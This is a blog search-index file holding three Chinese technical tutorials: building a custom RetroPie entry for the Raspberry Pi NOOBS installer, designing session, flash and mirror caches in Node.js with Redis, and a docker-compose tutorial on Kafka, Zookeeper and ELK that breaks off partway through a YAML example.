<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>NOOBS安装自定义系统</title>
    <url>/posts/noobs/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>前段时间折腾了一下树莓派，树莓派的操作系统安装时需要自己烧录img文件到SD卡中。烧录SD卡大体分为两种方式一种是吧一个img文件烧录到整张卡中，另一种是通过NBOOBS将多个img文件烧录到一张卡中。前者在windows下通过Win32DiskImager这个软件就能轻松的做到，后者需要使用到NBOOBS，下载地址：<a href="http://downloads.raspberrypi.org/NOOBS_latest">http://downloads.raspberrypi.org/NOOBS_latest</a> 。</p>
<p>NOOBS提供多个操作系统共存的方案，他提供了一个图形化的安装界面，在安装过程中读取定义好的配置文件，来选择要安装的各个系统。通过上文提到的下载地址下载回来的NOOBS，里面只预置了Raspbian这个系统，但是我们想安装一些自定义的系统改怎么办呢？这就是本文要解决的问题。</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>关于添加自定义操作系统的问题，在NOOBS的github文档上也是有说明的，详见<a href="https://github.com/raspberrypi/noobs#how-to-create-a-custom-os-version">这里</a>。假设我们现在要安装<a href="http://blog.petrockblock.com/retropie/">RetroPie</a>这个系统，我们首先从<a href="http://blog.petrockblock.com/download/retropie-project-image/">官方地址</a>上把它下载下来。根据github上提到的教程，那么制作NOOBS系统就应该是下面几步。</p>
<ol>
<li>下载NOOBS.</li>
<li>解压下载后的文件。</li>
<li>进入<code>os</code>文件夹。</li>
<li>选择其中的一个子文件，拷贝一份新的。这里就拿Raspbin这个文件夹开刀。拷贝完成后，将文件夹改名RetroPie，现在目录下的文件结构如下：</li>
</ol>
<p><img src="http://blog.whyun.com/images/noobs_os_dir.jpg" alt="noobs的os文件夹文件列表"><br>下面要依次讲解各个文件的作用。<br>5. 好，现在我们修改RetroPie文件夹下的os.json文件，这里面定义的数据将会在安装的时候显示为操作系统的标题和描述等信息。我大体上将其改为如下形式：</p>
<pre><code>    &#123;
      &quot;name&quot;: &quot;retropie&quot;,
      &quot;version&quot;: &quot;2.3&quot;,
      &quot;release_date&quot;: &quot;2014-05-31&quot;,
      &quot;kernel&quot;: &quot;3.12&quot;,
      &quot;description&quot;: &quot;The RetroPie Project started with the idea of turning the Raspberry Pi into a retro-gaming console and evolved ever since.&quot;,
      &quot;url&quot;: &quot;http://blog.petrockblock.com/retropie/&quot;,
      &quot;username&quot;: &quot;pi&quot;,
      &quot;password&quot;: &quot;raspberry&quot;,
      &quot;feature_level&quot;: 123900
    &#125;
**配置文件2.1 os.json**
</code></pre>
<p>其中<code>name</code>肯定就是名称了，然后是<code>version</code>版本，<code>description</code>描述等信息。<br>同时，我们留意到文件<code>flavours.json</code>中的内容和<code>os</code>中很多重复，可以称作是<code>os.json</code>的简版，这个文件最终要被引导程序读取，显示引导菜单，供给用户选择安装哪些操作系统。注意由于我们的文件夹是复制产生的，所以这个文件也要相应的修改，否则引导菜单发现了两个一模一样的操作系统名称，就会忽略掉其中一个，这样你辛辛苦苦做出来的引导就不管用了。<br>6. 【可选】你可以放一个RetroPie.png来定义一下当前操作系统的logo。<br>7. 【可选】你可以在文件夹<code>slides_vga</code>中放一下说明性的图片，他会在安装过程中当成幻灯片播放出来。<br>8. 这一步是进行分区文件配置，先把做好的分区文件<code>partitions.json</code>贴出来：</p>
<pre><code>&#123;
  &quot;partitions&quot;: [
    &#123;
      &quot;label&quot;: &quot;boot&quot;,
      &quot;filesystem_type&quot;: &quot;FAT&quot;,
      &quot;partition_size_nominal&quot;: 60,
      &quot;want_maximised&quot;: false,
      &quot;uncompressed_tarball_size&quot;: 11,
      &quot;mkfs_options&quot;: &quot;-F 32&quot;
    &#125;,
    &#123;
      &quot;label&quot;: &quot;root&quot;,
      &quot;filesystem_type&quot;: &quot;ext4&quot;,
      &quot;partition_size_nominal&quot;: 2700,
      &quot;want_maximised&quot;: true,
      &quot;mkfs_options&quot;: &quot;-O ^huge_file&quot;,
      &quot;uncompressed_tarball_size&quot;: 2203
    &#125;
  ]
&#125;
</code></pre>
<p><strong>配置文件2.2 partitions.json</strong></p>
<p>可以看到在json文件中属性partitions是一个数组类型，数组每个元素定义的是一个分区信息。首先看label为boot的分区，这是一个FAT格式的分区，被用作操作系统启动分区；然后label为root的是ext4分区，里面存放linux操作系统分区。partition_size_nominal是说分区的大小，want_maximised是说当前分区是否需要被扩展，如果为false，则分区的大小就是partition_size_nominal的指定值，如果为true，则noobs会根据sd卡的大小尽量的分配尽可能多的空间给当前分区。<br>9. 之前说过，我们从retropie官网上下载下来它的安装文件，将其解压后我们得到一个img文件。按照noobs给出的文档，根据partitions.json中的配置的信息，我们应该生成两个压缩文件，分别为boot.tar.xz和root.tar.gz，文件名实际上对应的是配置文件中的label属性。那么我们现在得到的是img文件，怎样得到这两个文件呢？<br>    如果你是用linux，这个问题很好解决，linux下可以使用mount命令直接把img文件挂载到指定目录上；如果使用windows，那就只能用虚拟机了。好吧，我就是用的windows，打开自己的虚拟机，通过vbox上的共享目录，来访问windows上的这个img文件。<br>    <img src="http://blog.whyun.com/images/select_share.png" alt="vbox共享"><br>    <strong>图2.1 共享文件夹设置1</strong><br>    在弹出的界面中新增一个共享设置，我们假设img文件放在e:\sharing下，那么可以做如下设置：<br>    <img src="http://blog.whyun.com/images/add_new_vbox_share.png" alt="新建共享"><br>    <strong>图2.2 新建共享</strong><br>    最后在ubuntu下通过命令<code>mount -t vboxsf sharing /mnt/share</code>来加载这个共享（这里假设&#x2F;mnt&#x2F;share目录已经存在了）。在&#x2F;mnt&#x2F;share下我们用fdisk命令来查看img文件内部的分区情况：</p>
<pre><code>fdisk -lu RetroPieImage_ver2.3.img
该命令将会输出如下内容：

Disk RetroPieImage_ver2.3.img: 3460 MB, 3460300800 bytes
255 heads, 63 sectors/track, 420 cylinders, total 6758400 sectors
Units = 扇区 of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x000981cb

                   设备 启动 起点 终点 块数 Id 系统
RetroPieImage_ver2.3.img1 8192 122879 57344 c W95 FAT32 (LBA)
RetroPieImage_ver2.3.img2 122880 6676479 3276800 83 Linux
</code></pre>
<p>通过输出可以轻易的发现，img文件中有两个分区，第一个分区从8192扇区开始，第二个分区从122880扇区开始，然后输出信息还指示一个扇区是512字节。接下来我们创建两个目录来加载这两个目录：</p>
<pre><code>sudo mkdir /mnt/share/img1
sudo mkdir /mnt/share/img2
</code></pre>
<p>接下来是mount命令的使用，mount命令的<code>-o</code>参数可以指定从某一个字节处开始mount，那么加载第一个分区的命令就是如下所示了：</p>
<pre><code>sudo mount -o loop,offset=$((8192*512)) RetroPieImage_ver2.3.img /mnt/share/img1
</code></pre>
<p>现在我们进入img1目录，进行打包：</p>
<pre><code>tar -cvpf ../boot.tar .
</code></pre>
<p>其中打包的时候我们制定了<code>p</code>参数，这里是告诉tar命令，在tar命令运行时，要保留原文件的权限属性不变。<br>接着就是使用xz命令就行压缩了：</p>
<pre><code>xz -9 -e boot.tar
</code></pre>
<p>最终生成一个<code>boot.tar.xz</code>文件，拷贝到文件夹RetroPie中。同理我们可以再生成一个<code>root.tar.xz</code>文件。<strong>但是要注意，在生成<code>boot.tar</code>的时候要使用管理员权限，即运行<code>sudo tar -cvpf ../root.tar</code>，否某些文件会提示没有权限操作。</strong><br>10. noobs在进行分区的时候需要读取脚本<code>partition_setup.sh</code>来完成分区操作，如果当前系统是由<code>Raspbian</code>改装来的（比如<code>RetroPie</code>和<code>raspbmc</code>、<code>Pidora</code>），那么直接使用<code>Raspbian</code>文件夹中的<code>partition_setup.sh</code>即可，但是有一些系统不是标准linux，比如说<code>openelec</code>，这时候你可以从github项目<a href="https://github.com/procount/noobsconfig">procount&#x2F;noobsconfig</a>找到相应的sh脚本文件。<br>11. 最后我们就是格式化SD卡了，使用SDFormatter（<a href="https://www.sdcard.org/chs/downloads/formatter_4/">下载页面地址</a>）将你的SD卡格式化，然后将制作好的noobs文件全部拷贝到sd卡中，保证recovery.img在sd卡根目录：</p>
<p><img src="http://blog.whyun.com/images/noobs_files.jpg" alt="noobs根目录"><br><strong>图2.3 sd卡根目录</strong><br>至此一个自定义的操作系统已经成功制作完成，将sd卡插入树莓派就可以安装了。</p>
]]></content>
      <categories>
        <category>Raspberry</category>
      </categories>
  </entry>
  <entry>
    <title>Node 缓存优化之路</title>
    <url>/posts/node/the-cache-design-in-node/</url>
    <content><![CDATA[<p>当今互联网，越来越往大数据的方向发展。大数据的背后是大用户，你的后端服务必须得有能力承载大用户、高并发的冲击。从宏观上讲，提高并发能力，无怪乎横向扩展（增加服务器节点个数）、纵向扩展（提高单点服务器的处理能力）。横向扩展，常见的有负载均衡，是一种部署的拓扑结构；纵向扩展，更多的体现的在应用程序本身性能提升。计算机中，我们常用拿空间换时间，来提升程序性能，缓存正是这种思想的体现。  </p>
<blockquote>
<p>本文链接地址 <a href="https://blog.whyun.com/posts/node/the-cache-design-in-node">https://blog.whyun.com/posts/node/the-cache-design-in-node</a> ,转载请注明出处。</p>
</blockquote>
<p>我们这篇文章讲 Node 的缓存设计，不过在切入正题之前，我还是要先讲一下 Node 的线程模型，如下图：</p>
<p><img src="/images/node_threads.png" alt="Node 线程模型"></p>
<p><strong>图片0.1 Node 线程模型</strong></p>
<p>我们常说 Node 是单线程程序，这是由于我们 JavaScript 代码（基于 V8 引擎）正是运行在这个单线程中的，此外我们常说的事件轮询、网络 IO 都是运行在这个线程中的。不过 Node 进程中，并不仅仅只包含这一个线程，它还有一个线程池，用来处理 文件 IO 、crypto 、zlib，还有异步 C++ 模块等操作，只不过，我们平常在 Node 中运用这些操作比较少。</p>
<h2 id="1-缓存分类"><a href="#1-缓存分类" class="headerlink" title="1. 缓存分类"></a>1. 缓存分类</h2><p>从生命周期上讲，缓存大体上分以下三类，</p>
<ol>
<li><p>会话 跟用户登陆状态关联的数据，生命周期长 </p>
</li>
<li><p>临时数据，短时间内有效，生命周期短 </p>
</li>
<li><p>镜像 数据库的数据镜像，生命周期特长</p>
</li>
</ol>
<h2 id="2-缓存设计思路"><a href="#2-缓存设计思路" class="headerlink" title="2. 缓存设计思路"></a>2. 缓存设计思路</h2><h3 id="2-1-会话"><a href="#2-1-会话" class="headerlink" title="2.1 会话"></a>2.1 会话</h3><p>现如今，各种设备终端兴起，很多情况下，我们要自己设计用户会话，而不是直接使用传统 web 中使用的 session，以便更好的适配多端设备，并且能够更好的对性能进行调优。</p>
<p>一个简单的 session 设计思路，就是生成一个 token，然后将用户数据序列化成 JSON 字符串，最后将 token 和 JSON 字符串的映射关系写入 redis。在读取的时候，根据 token 查询到 JSON 字符串，然后反序列化即可。</p>
<p>咋一看，这个设计是没有问题的，不过经过性能测试发现，Node 中 JSON 的反序列化性能是不高的，解决这个问题也很简单，我们将 redis 中反序列化的数据缓存到内存即可，这样用户下次请求的 token 验证就直接走内存了。<br>不过这又会导致一个问题，如果你的用户量数据巨大，那么内存是不够用的。我们必须得有内存清理机制，否则早晚内存会炸掉。</p>
<p>应该怎么清理呢？每天凌晨将内存中的数据清理掉，但是如果白天内存就告急了怎么半？限制内存存储数据个数，在达到内存限制个数后，内存中存储的都是老数据，如果这些老数据都是冷数据，新来的请求还算是会频繁的请求 redis ，做反序列化。<br>怎么办？有没有既限制内存数量，且又能读写热数据的思路呢？还真有，这就是 <strong>L</strong>(Least)<strong>R</strong>(Recently)<strong>U</strong>(Used) 算法.。不过如果你使用 JavaScript 编写一个 LRU 算法，就会在 V8 引擎中引入一个耗时操作，这在 Node 中是大忌。我们开头<strong>图0.1</strong>讲过，Node 进程中其实是有一个线程池的，我们何不将这个 LRU 实现代码，在这里实现？</p>
<p>我写了一个 c++ addon 来处理这个 LRU 算法，刚开始测试的时候性能很不错，看上去完美的解决了这个问题。不过随着时间的推移，我最担心的事情还是发生了，就是进程崩溃了！刚才我们说过，我们借用的是线程池来处理 LRU 算法，但是我们的程序中对于多线程操作，并没有加锁，导致处理的过程中出现脏数据，然后读写非法内存地址，进程就崩溃了。</p>
<p>我将线程操作加上了锁，加锁所导致的性能又一步做出了损耗，但依然在可控范围内。但是我们依然忽略了一个问题，我们做 LRU 就是要减少内存使用的，但是现在我们反而把 每个用户的 token 数据都写到内存中 LRU 关联的链表中，长此以往，内存依然会爆。</p>
<p>说到这里，我们的优化之路，貌似进入了死胡同，不过当你为一件事情殚精竭虑的时候，上天一定会眷顾你。一个偶然的机会，我发现了 Redis 的内存清理也是使用 LRU 算法的，同时在启用 LRU 时，性能也会下降，这跟我们使用LRU算法的结果是一样的。不过在 Redis 中还有一种算法，用来清理过期key，就是定期遍历 key 列表，从 key 列表中取出 N 个 key，判断其是否过期，如果过期，就删除。Redis 也是单线程，其线程模型和 Node 是类似的，所以它在遍历列表的时候，不会做全量遍历，而是使用定时器。增加定时定量的清理算法后，做性能测试，性能并没有损耗，同时还保证了内存占用在可控范围之内。</p>
<p>以上就是会话类型的缓存设计历程，对应的源代码已经开源，参见 <a href="https://www.npmjs.com/package/session-token">session-token</a>。</p>
<h3 id="2-2-闪存"><a href="#2-2-闪存" class="headerlink" title="2.2 闪存"></a>2.2 闪存</h3><p>使用闪存，一定是我们允许在短暂时间内缓存数据和真实数据有一定的误差，但是这个误差一定要在允许的范围之内。比如说做阈值处理时，通过 Redis 的 incr 操作做计数器，在达到阈值时就可以把这个值缓存到内存，在达到阈值的短暂时间内，真实的计数器的值我们并不关心。</p>
<p>整个设计思路类似于 JVM 或者 V8 的新生代 GC 算法：</p>
<p>  <img src="/images/young_old_area.png" alt="young/old"></p>
<p><strong>图 2 .2 young&#x2F;old</strong></p>
<p>缓存数据在写入的时候，现如 young 区域，程序内置定时器每隔固定时间将 young 区域赋值到 old 区域，同时清空 young 区域。</p>
<p>使用时要注意缓存击穿问题。比如说笔者曾经犯过的一个问题，在将 Redis 的查询的结果缓存到闪存，但是如果查询结果为空，没有将空的这个结果缓存下来，所以说对于 key 值不存在的情况，每次都是缓存不命中中的，每次都会请求 Redis。解决的问题也很简单，就是在闪存中保存一个空串。</p>
<p>对应的源代码解决方案参见 <a href="https://www.npmjs.com/package/flash-cache">flash-cache</a>。</p>
<h3 id="2-3-镜像"><a href="#2-3-镜像" class="headerlink" title="2.3 镜像"></a>2.3 镜像</h3><p>前段时间，我们接手了一个 IM 项目，要求实现类似于钉钉的功能，在线可以实时接收数据，离线后上线，可以查看未读历史记录。考虑到是一个实时系统，我们的没有选择直接读取 mongodb，而是将数据先写入 Redis 中。同时将实时聊天记录打入 Kafka，然后通过消费者程序同步到 mongodb。Redis 中存储的数据可以理解成 mongodb 中的镜像，读取的时候，先读取 Redis，只有在 Redis 中查询不到的时候才读取 mongodb （实际上这种情况几乎不可能发生，因为我们在 Redis 中缓存失效时间很长）。</p>
<p>镜像中一般用来映射数据库中的表记录，采用的 key 类型为 sorted set。但是数据库中的数据量是巨大的，全部缓存到一个 key 中，对于 Redis 是不友好的，所以说需要按天拆分 key。</p>
<p>前面说到 key 的类型为 sorted set，那么 score 是什么呢？score 是一个自增数字，我们用自增数字来唯一标识一条聊天记录。者个自增数字使用的是 Redis 的 incr 操作客户端本地存留一个上次阅读到的聊天 Id，服务器端可以根据上次阅读Id，就可以给客户端返回历史记录（操作过程中会涉及到分页查询）。</p>
<h2 id="3-性能测试"><a href="#3-性能测试" class="headerlink" title="3. 性能测试"></a>3. 性能测试</h2><p>关于性能调优的方法和工具，可以参见我写的《Node 基础教程》中的第11章 <a href="https://github.com/yunnysunny/nodebook/blob/master/text/11_node_optimization.md">Node 调优</a>。</p>
]]></content>
      <categories>
        <category>Node</category>
      </categories>
  </entry>
  <entry>
    <title>docker compose 教程</title>
    <url>/posts/docker-compose-tutorial/</url>
    <content><![CDATA[<p>docker 容器提供了一种封装格式，可以将应用和其运行环境封装在一起，但是在线上实践过程中，应用和应用之间难免要产生依赖，一个上游的应用，可能会依赖于下游的一个或者几个应用给其提供数据。正所谓一个好汉三个帮，现实情况中，一个服务部署完成之后，对外不产生依赖的情况还是比较少的，但是 docker 在开始设计的时候没有过多考虑到容器之间依赖关系的处理。为了解决这个问题，在后续的发展中，一系列的容器编排的技术出现，比如说 <code>Docker Swarm</code> <code>Marathon</code> <code>Kubernetes</code> 等。上面提到的编排工具都是可以用在生产环境上的解决方案，不过本文要讲一下 <code>Docker Compose</code> 这个官方给出的编排解决方案，由于其功能比较简单，一般出于测试目的来使用，不过正式由于其简单，对于理解更高级的编排工具来说，算是一个好的入门。</p>
<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><p>由于在 Mac 和 Windows 的桌面程序 Docker Desktop 上，docker compose 是自带的，下面仅给出 Linux 下的安装命令：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo curl -L &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.29.2&#x2F;docker-compose-$(uname -s)-$(uname -m)&quot; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose
sudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>代码 1.1</strong></p>
<p>确保 &#x2F;usr&#x2F;local&#x2F;bin 处在 PATH 环境变量中，就可以在命令行中使用  docker-compose 命令了，正常情况下运行 <code>docker-compose --version</code> 会显示当前的版本号。</p>
<h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2. 使用"></a>2. 使用</h2><h3 id="2-1-服务依赖"><a href="#2-1-服务依赖" class="headerlink" title="2.1 服务依赖"></a>2.1 服务依赖</h3><p>为了方便举例，这里使用 kafka 这款软件来做演示，因为这款软件天生要依赖于 zookeeper 。简单起见，还是先做一个只启动 zookeeper 的配置文件：</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">"3"</span>
<span class="token key atrule">services</span><span class="token punctuation">:</span>
  <span class="token key atrule">my-zookeeper</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> <span class="token string">'bitnami/zookeeper:latest'</span>
    <span class="token key atrule">user</span><span class="token punctuation">:</span> root
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> my<span class="token punctuation">-</span>zk
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">'2981:2181'</span>
    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ALLOW_ANONYMOUS_LOGIN=yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.1.1</strong></p>
<p>将 代码 2.1 保存为文件 docker-compose.yml ，然后再其所在目录中执行 <code>docker-compose up</code> 即可成功启动配置文件中的 docker。运行完成之后会在控制台有如下输出：</p>
<p><img src="/images/image-20211021182438597.png" alt="image-20211021182438597"></p>
<p><strong>图 2.1.1</strong></p>
<p>由于 docker 镜像中部署的应用大都是在前台运行的，使用 docker-compose 的时候也沿袭了这一个特性，使用 CTRL + C 才可退出当前容器。如果想在后台运行，使用  <code>docker-compose up -d</code> 即可。</p>
<p>其实看 <strong>代码 2.1.1</strong> 转化成 docker run 命令的话，就是  <code>docker run --name my-zk --restart always --user root -e ALLOW_ANONYMOUS_LOGIN=yes -p 2981:2181  bitnami/zookeeper:latest</code>。如果 docker-compose 配置文件中只有一个 docker 容器的配置的话，其优势不大。</p>
<p>下面在刚才的 docker-compose.yml 中再添加 kafka 的配置：</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">"3"</span>
<span class="token key atrule">services</span><span class="token punctuation">:</span>
  <span class="token key atrule">my-zookeeper</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> <span class="token string">'bitnami/zookeeper:latest'</span>
    <span class="token key atrule">user</span><span class="token punctuation">:</span> root
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> my<span class="token punctuation">-</span>zk
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">'2981:2181'</span>
    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ALLOW_ANONYMOUS_LOGIN=yes
  <span class="token key atrule">my-kafka</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> <span class="token string">'bitnami/kafka:latest'</span>
    <span class="token key atrule">user</span><span class="token punctuation">:</span> root
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> my<span class="token punctuation">-</span>kfk
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">'9892:9892'</span>
    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> KAFKA_BROKER_ID=1
      <span class="token punctuation">-</span> KAFKA_LISTENERS=PLAINTEXT<span class="token punctuation">:</span>//<span class="token punctuation">:</span><span class="token number">9892</span>
      <span class="token punctuation">-</span> KAFKA_ADVERTISED_LISTENERS=PLAINTEXT<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span><span class="token number">9892</span>
      <span class="token punctuation">-</span> KAFKA_ZOOKEEPER_CONNECT=my<span class="token punctuation">-</span>zookeeper<span class="token punctuation">:</span><span class="token number">2181</span>
      <span class="token punctuation">-</span> ALLOW_PLAINTEXT_LISTENER=yes
    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> my<span class="token punctuation">-</span>zookeeper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.1.2</strong></p>
<p>注意上述代码中的 depends_on 属性，这里填写了 my-zookeeper，则代表 my-kafka 这个 service 将会在 my-zookeeper 启动之后再启动。</p>
<blockquote>
<p>虽然在 docker-compose 中每个 service 下面仅仅包含一个容器，但是 docker-compose 还是在容器的基础上抽象了一层，管它叫 service。</p>
</blockquote>
<p>但是这里面会有一个坑，首先考虑这么一个问题，就是如何判定一个 service 启动完成呢？docker-compose 认为只要运行了 docker 的启动脚本，就算启动完成了。但真实情况是运行完一个服务程序后，它自己本身要做大量初始准备工作，这些工作并不能在瞬时完成。具体到我们上面的例子，在 zookeeper 服务没有准备好的情况下如果依赖于它的 kafka 这时候也处在启动阶段，就会出现报错信息。所以一个更优雅的解决方案，是在 kafka 的启动服务中判断 zookeeper 的监听端口是否可用，等待其可用后再启动其自身服务。</p>
<p><img src="/images/image-20211021203923577.png" alt="image-20211021203923577"></p>
<p><strong>图 2.1.2</strong></p>
<p>我们从 <strong>图 2.1.2</strong> 的输出中可以看出，kakfa 和 zookeeper 的日志是交替打印的，如果 kafka 早于 zookeeper 启动，就会出现找不到 zookeeper 服务的现象（然后 kafka 服务内部会有重试策略，但是还是会出现错误日志打印，给排查问题造成困扰）。</p>
<p>在 kafka 启动前先检测 zookeeper 端口是否可用的方案，很遗憾没有在 bitnami 的 dockerfile <a href="https://github.com/bitnami/bitnami-docker-kafka">github 项目</a>中实现。不过 docker <a href="https://docs.docker.com/compose/startup-order/">官方文档</a>中给出的解决方案是使用 <a href="https://github.com/Eficode/wait-for">wait-for</a> 等工具来完成。</p>
<h3 id="2-2-网络"><a href="#2-2-网络" class="headerlink" title="2.2 网络"></a>2.2 网络</h3><p><strong>代码 2.1.2</strong> 中 kafka 之所以能够和 zookeeper 通信，是由于两者在同一个网络中。docker-compose 在启动当前配置文件的时候，默认会创建一个单独的网络，然后把当前配置文件中的所有容器都加入其中。</p>
<blockquote>
<p>docker-compose 的 network 在底层会使用 docker network create 命令进行创建网络。使用教程可以参见<a href="https://docs.docker.com/engine/reference/commandline/network_create/">官方文档</a>。</p>
</blockquote>
<p>我们通过 <code>docker network ls</code> 可以查看当前系统的 docker 创建的网卡：</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\lenovo&gt; docker network ls
NETWORK ID     NAME                   DRIVER    SCOPE
f81f27e241f7   2_default              bridge    local
9dea2e94021d   bridge                 bridge    local
2dff57895828   host                   host      local
a9e1acde9ceb   multi_cluster_consul   bridge    local
c85a7f7e1a68   none                   null      local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中 <code>2_default</code> 是通过 <strong>代码 2.1.2</strong> 启动的 docker 组件生成的网络配置。其格式为 <code>$&#123;project-name&#125;_default</code>，其中 <code>$&#123;project-name&#125;</code> 默认为 docker-compose 的所在文件夹的名字（不过如果你的文件夹名中有 <code>.</code> 的话，会取 <code>.</code> 前部的名字）。你也可以运行 docker-compose 命令时使用 <code>--project-name</code> 参数来指定项目名称，使用 <code>docker-compose up --project mycs</code> 重新运行 <strong>代码 2.1.2</strong>（如果之前已经运行了，需要先运行 <code>docker-compose down</code>，否则会启动报错，提示容器已经存在）。重复运行 <code>docker network ls</code> 可以发现网络名称已经更换了：</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\lenovo&gt; docker network ls
NETWORK ID     NAME                   DRIVER    SCOPE
9dea2e94021d   bridge                 bridge    local
2dff57895828   host                   host      local
a9e1acde9ceb   multi_cluster_consul   bridge    local
029b23c6ff51   mycs_default           bridge    local
c85a7f7e1a68   none                   null      local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当然你也可以在 docker-compose.yml 文件中手动指定 network 名称，假设 docker-compose 中有三个容器，可以把 容器 1 和容器 2 使用一个网络，容器 2 和容器 3 使用一个网络，容器 1 和 容器 3 之间网络不能直接访问。上述用法在实践中用的比较少，这里省略不讲。如果读者比较关心，可以参考官方文档的<a href="https://docs.docker.com/compose/networking/#specify-custom-networks">例子</a>。</p>
<p>由于大家的使用习惯是在 docker-compose.yml 文件中直接使用 <code>docker-compose up -d</code> 来拉起一组 docker 容器，这时候一定要留意你不同 yml 文件所在的文件名要做成不一样的，否则它在创建 network 名称的时候会冲突。</p>
<h3 id="2-3-举个例子"><a href="#2-3-举个例子" class="headerlink" title="2.3 举个例子"></a>2.3 举个例子</h3><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">"3"</span>
<span class="token key atrule">services</span><span class="token punctuation">:</span>
  <span class="token key atrule">elasticsearch</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> <span class="token string">'elastic/elasticsearch'</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> elasticsearch
    <span class="token key atrule">ulimits</span><span class="token punctuation">:</span>
      <span class="token key atrule">nofile</span><span class="token punctuation">:</span> <span class="token number">65536</span>
      <span class="token key atrule">memlock</span><span class="token punctuation">:</span> <span class="token number">-1</span>
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">'9200:9200'</span>
      <span class="token punctuation">-</span> <span class="token string">'9300:9300'</span>
    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ES_JAVA_OPTS=<span class="token punctuation">-</span>Xms1g <span class="token punctuation">-</span>Xmx1g
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ./elasticsearch.yml<span class="token punctuation">:</span>/usr/share/elasticsearch/config/elasticsearch.yml
      <span class="token punctuation">-</span> ./data<span class="token punctuation">:</span>/usr/share/elasticsearch/data
      <span class="token punctuation">-</span> ./log<span class="token punctuation">:</span>/usr/share/elasticsearch/logs

  <span class="token key atrule">logstash</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> <span class="token string">'elastic/logstash'</span>
    <span class="token key atrule">user</span><span class="token punctuation">:</span> root
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> logstash
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">'5000:5000'</span>
      <span class="token punctuation">-</span> <span class="token string">'5050:5050/udp'</span>
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span> 
      <span class="token punctuation">-</span> ./logstash.yml<span class="token punctuation">:</span>/usr/share/logstash/config/logstash.yml<span class="token punctuation">:</span>ro
      <span class="token punctuation">-</span> ./log4j2.properties<span class="token punctuation">:</span>/usr/share/logstash/config/log4j2.properties<span class="token punctuation">:</span>ro
      <span class="token punctuation">-</span> ./pipeline<span class="token punctuation">:</span>/usr/share/logstash/pipeline
    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> LS_JAVA_OPTS=<span class="token punctuation">-</span>Xms1024m <span class="token punctuation">-</span>Xmx1024m <span class="token punctuation">-</span><span class="token punctuation">-</span>illegal<span class="token punctuation">-</span>access=warn
